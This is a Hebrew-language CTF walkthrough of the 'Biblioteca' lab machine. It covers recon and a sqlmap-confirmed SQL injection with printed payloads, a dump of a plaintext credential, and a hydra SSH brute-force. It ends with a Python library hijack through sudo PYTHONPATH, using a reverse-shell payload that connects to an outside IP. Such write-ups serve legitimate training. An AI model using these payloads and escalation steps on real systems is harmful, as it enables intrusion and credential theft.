# Biblioteca
![[Pasted image 20260330090809.png]]
רמה: בינונית (חימום)
קטגוריה: (web)
מטרה: `10.114.175.248`

שלחתי בקשת פינג כדי לראות 3 דברים:
- אם החיבור לרשת VPN עבר
- האם המטרה לא חוסמת הודעות ICMP
- האם המטרה חיה

עכשיו אני יבצע סריקת שירותים כדי לבדוק מה פועל עליו
השתמשתי בפקודה: `nmap -sC -sV -T4 10.114.175.248`
ומצאתי את הדברים הבאים:
``` nse
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 09:13 IDT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 09:13 (0:00:00 remaining)
Nmap scan report for 10.114.175.248
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 08:8e:f8:95:5b:c0:0e:23:ad:6d:98:08:4a:0a:ca:f5 (RSA)
|   256 fe:90:a9:a2:87:d6:8b:19:a6:1c:76:d7:cc:84:76:bc (ECDSA)
|_  256 26:8e:f5:2c:1b:cb:3b:6f:29:d0:21:d8:10:75:8f:7b (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
```

פורט 22 לשליטה מרחוק דרך SSH 
ופורט 8000 של HTTP שעובד על הגרסה: `Werkzeug httpd 2.0.2 (Python 3.8.10)`
אני עכשיו בודק אם הגרסה הזאת פגיעה
לא מצאתי משהו מיוחד או חולשות שקיימות כבר על הגרסה הזאת
נמשיך לגלוש באתר.

![[Pasted image 20260330091906.png]]

יש הרשמה והתחברות אני ינסה לראות האם יש עוד דפים
ומה יש ב- source code
ב SOURCE אין הערות חשודות, עכשיו אני ישתמש ב- nuclei 
וב- dirsearch כדי לראות עוד אינפורמציה
![[Pasted image 20260330092441.png]]

הכלי dirsearch לא אמר לנו דברים שלא ידענו, אנחנו צריכים לבדוק מה עם הnuclei לאחר מכן נראה האם לזרום עם הממשק ולנסות להתחבר
או לנצל את הדרך פנימה 
``` json

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.7.1

                projectdiscovery.io

[INF] Current nuclei version: v3.7.1 (latest)
[INF] Current nuclei-templates version: v10.4.0 (latest)
[INF] New templates added in latest release: 94
[INF] Templates loaded for current scan: 9998
[INF] Executing 9976 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 22 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 2309 (Reduced 2161 Requests)
[INF] Using Interactsh Server: oast.me
[snmpv3-detect] [javascript] [info] 10.114.175.248:8000 ["Enterprise: unknown"]
[http-missing-security-headers:permissions-policy] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:x-frame-options] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:x-content-type-options] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:referrer-policy] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:clear-site-data] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:missing-content-type] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:strict-transport-security] [http] [info] http://10.114.175.248:8000
[http-missing-security-headers:content-security-policy] [http] [info] http://10.114.175.248:8000
[INF] Skipped [10.114.175.248:8000]:5814 from target list as found unresponsive permanently: Get "https://10.114.175.248:8000:5814/autopass": cause="no address found for host"
[INF] Skipped 10.114.175.248:8000 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://10.114.175.248:8000:5814/autopass"
[tech-detect:python] [http] [info] http://10.114.175.248:8000
[options-method] [http] [info] http://10.114.175.248:8000 ["GET, OPTIONS, HEAD"]
[INF] Skipped 10.114.175.248:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=10.114.175.248:4040 chain="connection refused; got err while executing http://10.114.175.248:4040/jobs/"
[INF] Scan completed in 2m. 15 matches found.
```

גם nuclei לא הראה משהו מיוחד מה שנשאר לנו זה רק להתחבר כרגיל ולבדוק את הממשק מאחורי הדף התחברות
גם לאחר התחברות כרגיל אנחנו רואים שהדף עצמו ריק
רק logout יש:
![[Pasted image 20260330093423.png]]

למרות שזה נראה בלתי אפשרי לפריצה מי שיש לו מספיק ניסיון ישר מבין שהפריצה היא ממוקדת והיחידה שיכולה להיות אפשרות מבחינתינו:
שזאת `SQL Injection` ללוגין.
אני השתמש בכלי בשם sqlmap כדי לבדוק האם הבקשת לוגין (כניסה)
פגיעה ל SQLi:
![[Pasted image 20260330093729.png]]

### (הייתה לי הפסקה קטנה..)

לאחר שבדקנו את הבקשה של הכניסה הכלי `sqlmap` אישר את הפגיעות בלי בעיה ומצאנו את הפריצה רק נותר לנצל ולקבל את ההרשאות שלנו במסגרת ה- CTF.
התגובה של הכלי בחזרה:
``` json
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 4183 FROM (SELECT(SLEEP(5)))SFEt) AND 'xMye'='xMye&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=test' UNION ALL SELECT NULL,CONCAT(0x717a767a71,0x6c4b635350594a52537779566557486e4d6f4f566e456f69626f5258765a5a6a58525175707a7047,0x7171786271),NULL,NULL-- -&password=test
---
[10:43:47] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[10:43:48] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] performance_schema
[*] website

[10:43:48] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 26 times
[10:43:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.114.181.45'
[10:43:48] [WARNING] your sqlmap version is outdated

[*] ending @ 10:43:48 /2026-03-30/
```
 
 הוא גילה לנו את הבסיסי נתונים שנמצאים בתוך השרת וניתן לגשת אליהם בעזרת הפגיעות, נכנס לבסיס נתונים שנקרא `website` ונבדוק מה הם העמודות שנמצאות בפנים לפי הפקודה `sqlmap -r request.txt -p username -D website --tables`:
 ``` json
 sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 4183 FROM (SELECT(SLEEP(5)))SFEt) AND 'xMye'='xMye&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=test' UNION ALL SELECT NULL,CONCAT(0x717a767a71,0x6c4b635350594a52537779566557486e4d6f4f566e456f69626f5258765a5a6a58525175707a7047,0x7171786271),NULL,NULL-- -&password=test
---
[10:49:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[10:49:57] [INFO] fetching tables for database: 'website'
Database: website
[1 table]
+-------+
| users |
+-------+

[10:49:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.114.181.45'
[10:49:57] [WARNING] your sqlmap version is outdated
 ```

נכנס לטבלה של המשתמשים כדי לקבל שמות משתמשים וסיסמאות מבסיס הנתונים לפי הפקודה `sqlmap -r requrest222.txt -p username -D website -T users --dump`
המשתמש שקיבלנו:
``` json
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+
```

לפי הניסיונות שלנו להתחבר למערכת באתר אנחנו מבינים שאין טעם להיכנס עם השם משתמש והסיסמא לאתר כי אין שם תוכן.
אבל אנחנו צריכים לזכור שיש גם פורט 22 פתוח שזה SSH (שליטה מרחוק)
אולי זה יכול לעבוד שם:
![[Pasted image 20260330105633.png]]

קיבלנו שליטה על המכונה! ננסה לחפש את הדגלים ונראה מה אפשר לעשות..
מצאתי את הדגל הראשון, אבל אני לא יכול לפתוח אותו בגלל שאין לי את ההרשאות, אני לא במשתמש המתאים `hazel`
![[Pasted image 20260330105936.png]]

ננסה להיכנס למשתמש בעזרת Brute Force של הסיסמא כי יש לנו כבר שם משתמש, ורק נותר לנו לנסות סיסמאות שונות בשביל לראות את הסיסמא הנכונה, בשביל זה יש לנו כלי שקוראים לו `hydra` שהוא כלי רחב מאוד לביצוע Brute Force בממשקים שונים.

הפקודה: `hydra -l hazel -P rockyou.txt ssh://10.114.181.45 -t 4 -I -f`
הכלי בתגובה:
``` json
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-30 11:09:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
[DATA] attacking ssh://10.114.181.45:22/
[22][ssh] host: 10.114.181.45   login: hazel   password: hazel
```

יש לנו שם משתמש וסיסמא, אנחנו יכולים להיכנס לקחת את הדגל הראשון:
![[Pasted image 20260330111157.png]]

באותה תיקיה של המשתמש הזה, נמצא הקובץ `hasher.py`
הסטטוס של הקובץ: `-rw-r----- 1 root  hazel  497 Dec  7  2021 hasher.py`
הוא משתמש מופעל על ידי root ואפשר לשנות לו את המיקום קובץ:
``` json
hazel@ip-10-114-181-45:~$ sudo -l
Matching Defaults entries for hazel on ip-10-114-181-45:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on ip-10-114-181-45:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

זה חשוב מאוד אנחנו יכולים להחליף את מיקום הקובץ, ובניסיון לפתוח את הקובץ אנחנו רואים שהקובץ משתמש ב `import hashlib` אנחנו יכולים לעשות `python library hijack` וגם מכיוון שאני יכול להפנות את PYTHONPATH לספרייה שאני שולט בה.
אם אשים hashlib.py זדוני בספרייה זו, Python יעשה `import` לקובץ שלי במקום הקובץ האמיתי, שמתי שאני יפעיל את הקובץ `hasher.py` אני יוכל להשתלט עליו ולגרום לו לעשות מה שבא לי, במקרה שלנו להיכנס דרך root

![[Pasted image 20260330113427.png]]

החלפתי את המיקום של `hashlib` ל- tmp כי זאת תיקייה שיש לי עליה שליטה מלאה, והכנסתי לתוך hashlib את הפיילוד הבא:

``` python
import socket,subprocess,os,pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.200.27", 4444))  
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
PY
```

כל מה שנישאר לעשות זה להפעיל את הפורט ל- `reverse shell`
בעזרת `nc -lnvp 4444`
ולשנות את נתיב הקובץ הראשי כדי שהמערכת תזהה רק את הקובץ שלנו לייבוא בעזרת הפקודה `sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py` אנחנו יכולים לראות 

![[Pasted image 20260330114118.png]]


קיבלנו הרשאות root וסיימנו את האתגר CTF, לא היה כזה קשה אבל זה אחלה חימום ותרגול חשיבה של איש סייבר. 

![[Pasted image 20260330114506.png]]

